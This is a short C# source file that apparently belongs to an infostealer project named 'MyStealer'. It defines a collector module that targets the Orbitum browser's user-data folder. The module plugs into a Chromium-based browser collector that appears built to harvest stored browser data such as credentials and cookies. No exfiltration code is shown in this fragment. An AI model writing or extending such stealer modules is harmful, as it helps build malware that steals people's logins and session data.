using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Orbitum : Chromium
    {
        public override string ModuleName => "Orbitum";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Orbitum", "User Data");
    }
}
